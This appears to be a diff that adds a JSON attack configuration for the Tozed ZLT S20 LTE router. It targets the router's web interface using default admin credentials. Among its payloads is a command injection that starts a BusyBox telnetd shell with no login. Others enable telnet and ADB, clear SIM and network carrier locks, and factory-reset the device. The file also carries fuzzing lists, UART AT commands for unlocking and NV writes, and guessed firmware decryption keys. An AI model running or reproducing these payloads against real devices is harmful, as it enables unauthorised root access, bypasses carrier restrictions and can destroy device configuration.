@@ -1,0 +1,85 @@
+{
+  "name": "Tozed ZLT S20 1.12.7 (Dialog / SLT-Mobitel) - verified from service.js",
+  "target": "192.168.1.1",
+  "endpoints": {
+    "post_path": "/reqproc/proc_post",
+    "get_cmd_path": "/reqproc/proc_get",
+    "get_token_cmd": "get_token",
+    "get_random_login_cmd": "get_random_login",
+    "set_random_cmd": "set_random",
+    "get_random_cmd": "get_random",
+    "set_token_cmd": "set_token",
+    "csrf_token_header": "CSRFToken"
+  },
+  "fingerprint": {
+    "cmd": "device_version,tz_version_type,hardware_version,tr069_ServerURL",
+    "firmware_key": "tz_version_type",
+    "model_key": "hardware_version",
+    "acs_key": "tr069_ServerURL"
+  },
+  "login": {
+    "username": "admin",
+    "password": "admin"
+  },
+  "payloads": [
+    { "id": "REMOVE_WHITE_SITE", "method": "POST", "description": "priority: start BusyBox telnetd via ids command injection", "args": { "isTest": "false", "ids": "1 $(/bin/busybox telnetd -l /bin/sh)" } },
+    { "id": "SET_SIM_SETTING", "method": "POST", "description": "priority: clear SIM lock", "args": { "isTest": "false", "sim_lock": "0" } },
+    { "id": "TZ_CMD_SECURE_LOGIN", "method": "POST", "description": "priority: enable telnet/ADB", "args": { "isTest": "false", "telnetdEnable": "y", "adbEnable": "y" } },
+    { "id": "TZ_UNLOCK_PLMN", "method": "POST", "description": "verified: PLMN unlock trigger", "args": { "isTest": "false" } },
+    { "id": "SET_NETWORK", "method": "POST", "description": "reported: network selection / PLMN unlock", "args": { "isTest": "false", "NetworkNumber": "", "Rat": "0", "nSubrat": "" } },
+    { "id": "SET_PLMN", "method": "POST", "description": "reported: PLMN lock clear", "args": { "isTest": "false", "plmn_lock": "0" } },
+    { "id": "CONNECT_NETWORK", "method": "POST", "description": "reported: connect network", "args": { "isTest": "false", "disconnect_internet": "0" } },
+    { "id": "APN_PROC_EX", "method": "POST", "description": "reported: reset APN profile 1 to default", "args": { "isTest": "false", "apn_action": "set_default", "index": "1" } },
+    { "id": "SET_WEB_LANGUAGE", "method": "POST", "description": "reported: language + ADB toggle", "args": { "isTest": "false", "Language": "en", "adbd_enable": "1" } },
+    { "id": "SET_SYSTEM_INFO", "method": "POST", "description": "reported: telnetd toggle (unverified ID)", "args": { "isTest": "false", "telnetd_enable": "1" } },
+    { "id": "RESTORE_FACTORY_SETTINGS", "method": "POST", "description": "DESTRUCTIVE: factory reset", "args": { "isTest": "false" } }
+  ],
+  "fuzz": {
+    "keywords": ["plmn", "lock", "sim", "unlock", "nv_write"],
+    "goform_ids": [
+      "TZ_UNLOCK_PLMN",
+      "UNLOCK_PLMN_PSK",
+      "UNLOCK_NETWORK",
+      "TZ_SET_UNLOCK_CODE",
+      "TZ_GET_LOCK_PLMN",
+      "TZ_SET_LOCK_PLMN",
+      "TZ_GET_LOCK_BAND",
+      "TZ_SET_LOCK_BAND",
+      "CLEAR_IMSI",
+      "SET_SIM_SETTING",
+      "TZ_CMD_SECURE_LOGIN",
+      "SET_NETWORK",
+      "SET_PLMN",
+      "SET_SYSTEM_INFO",
+      "SET_WEB_LANGUAGE"
+    ],
+    "values": ["0", "1", "false", "true", "y", "n"],
+    "max_requests": 400
+  },
+  "uart": {
+    "port": "COM3",
+    "baud": 115200,
+    "data_bits": 8,
+    "stop_bits": 1,
+    "parity": "N",
+    "commands": [
+      { "name": "probe", "command": "AT", "expect": "OK" },
+      { "name": "identify", "command": "ATI", "expect": "OK" },
+      { "name": "unlock-sim-pn", "command": "AT+CLCK=\"PN\",0", "expect": "OK" },
+      { "name": "nv-write-debug", "command": "AT^NVW=0,0,1,1", "expect": "OK" },
+      { "name": "reboot", "command": "AT^RESET", "expect": "OK" }
+    ]
+  },
+  "crypto": {
+    "header_magic": ["TCTZ", "ZLT", "CFG", "WRG0"],
+    "key_lengths": [8, 16, 32],
+    "known_keys": [
+      "0000000000000000",
+      "1234567812345678",
+      "Tozed",
+      "ZLT",
+      "zlt_s20",
+      "slt_mobitel"
+    ]
+  }
+}
